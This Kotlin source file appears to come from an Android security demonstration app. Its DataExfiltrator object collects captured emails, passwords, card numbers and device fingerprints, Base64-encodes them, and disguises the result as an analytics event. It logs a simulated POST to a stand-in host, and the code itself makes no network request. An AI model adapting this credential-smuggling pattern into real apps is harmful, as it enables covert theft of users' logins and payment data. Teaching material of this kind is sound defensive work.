package com.ghosttouch.attacker.exfil

import android.util.Base64
import android.util.Log
import com.ghosttouch.attacker.capture.SessionRepository
import com.ghosttouch.common.model.CaptureSession
import com.google.gson.GsonBuilder
import com.google.gson.JsonObject
import java.util.UUID

/**
 * Simulates data exfiltration by encoding captured credentials AND device
 * intelligence into innocent-looking payloads disguised as analytics telemetry.
 *
 * Now includes full device intel in the exfiltrated payload — demonstrating
 * how much context an attacker gains alongside stolen credentials.
 *
 * Purely educational — no actual network requests are made.
 */
object DataExfiltrator {

    private const val TAG = "DataExfiltrator"
    private val gson = GsonBuilder().setPrettyPrinting().create()

    /**
     * "Exfiltrates" a capture session by encoding credentials + device intel
     * and logging the disguised payload.
     */
    fun exfiltrate(session: CaptureSession): String {
        // Step 1: Build the sensitive data (credentials)
        val sensitiveData = JsonObject().apply {
            addProperty("u", session.email)
            addProperty("p", session.password)
            addProperty("t", session.targetApp)
            if (session.cardNumber.isNotEmpty()) {
                addProperty("c", session.cardNumber)
            }
        }

        // Step 2: Build device fingerprint (separate from credentials)
        val deviceData = JsonObject()
        for ((key, value) in session.deviceIntel) {
            deviceData.addProperty(key, value)
        }

        // Step 3: Combine into a single payload and Base64-encode
        val combinedPayload = JsonObject().apply {
            add("creds", sensitiveData)
            add("env", deviceData)
        }
        val combinedJson = gson.toJson(combinedPayload)
        val encodedPayload = Base64.encodeToString(
            combinedJson.toByteArray(Charsets.UTF_8),
            Base64.NO_WRAP
        )

        // Step 4: Wrap in innocent-looking analytics event
        val disguisedPayload = JsonObject().apply {
            addProperty("event", "app_session_metric")
            addProperty("client_id", UUID.randomUUID().toString().take(8))
            addProperty("payload", encodedPayload)
            addProperty("ts", System.currentTimeMillis() / 1000)
            addProperty("version", "2.1.0")
            addProperty("platform", "android")
            addProperty("sdk_ver", "4.8.2")
            // Device intel fields mixed in as "normal" telemetry
            addProperty("os", session.deviceIntel["os.version"] ?: "unknown")
            addProperty("model", session.deviceIntel["device.model"] ?: "unknown")
            addProperty("locale", session.deviceIntel["locale.display"] ?: "unknown")
        }

        val payloadString = gson.toJson(disguisedPayload)

        // Step 5: Detailed log output
        Log.d(TAG, "")
        Log.d(TAG, "╔══════════════════════════════════════════════════════════════╗")
        Log.d(TAG, "║       SIMULATED EXFILTRATION — NOT ACTUALLY SENT            ║")
        Log.d(TAG, "╠══════════════════════════════════════════════════════════════╣")
        Log.d(TAG, "║ Target URL: https://analytics.fake-cdn.example/v2/collect   ║")
        Log.d(TAG, "║ Method: POST                                                ║")
        Log.d(TAG, "║ Content-Type: application/json                              ║")
        Log.d(TAG, "╠══════════════════════════════════════════════════════════════╣")
        Log.d(TAG, "║ DISGUISED PAYLOAD (looks like analytics):                   ║")
        Log.d(TAG, "╚══════════════════════════════════════════════════════════════╝")
        payloadString.lines().forEach { Log.d(TAG, "  $it") }

        Log.d(TAG, "")
        Log.d(TAG, "┌── DECODED: STOLEN CREDENTIALS ──────────────────────────────")
        Log.d(TAG, "│ User:     ${session.email}")
        Log.d(TAG, "│ Password: ${session.password}")
        if (session.cardNumber.isNotEmpty()) {
            Log.d(TAG, "│ Card:     ${session.cardNumber}")
        }
        Log.d(TAG, "│ Target:   ${session.targetApp}")
        Log.d(TAG, "└──────────────────────────────────────────────────────────────")

        Log.d(TAG, "")
        Log.d(TAG, "┌── DECODED: DEVICE INTELLIGENCE (${session.deviceIntel.size} fields) ──")
        var currentCat = ""
        for ((key, value) in session.deviceIntel) {
            val cat = key.substringBefore(".")
            if (cat != currentCat) {
                currentCat = cat
                Log.d(TAG, "│")
                Log.d(TAG, "│ [$currentCat]")
            }
            val field = key.substringAfter(".")
            Log.d(TAG, "│   %-26s = %s".format(field, value))
        }
        Log.d(TAG, "└──────────────────────────────────────────────────────────────")
        Log.d(TAG, "")

        // Step 6: Update session repository
        SessionRepository.updateExfilStatus(
            sessionId = session.id,
            encodedPayload = payloadString,
            status = "sent (simulated)"
        )

        return payloadString
    }

    /**
     * Decodes a Base64-encoded payload for display in the session viewer.
     */
    fun decodePayload(encodedPayload: String): String {
        return try {
            val json = gson.fromJson(encodedPayload, JsonObject::class.java)
            val base64Data = json.get("payload")?.asString ?: return "No payload field"
            val decoded = Base64.decode(base64Data, Base64.NO_WRAP)
            String(decoded, Charsets.UTF_8)
        } catch (e: Exception) {
            "Decode error: ${e.message}"
        }
    }
}
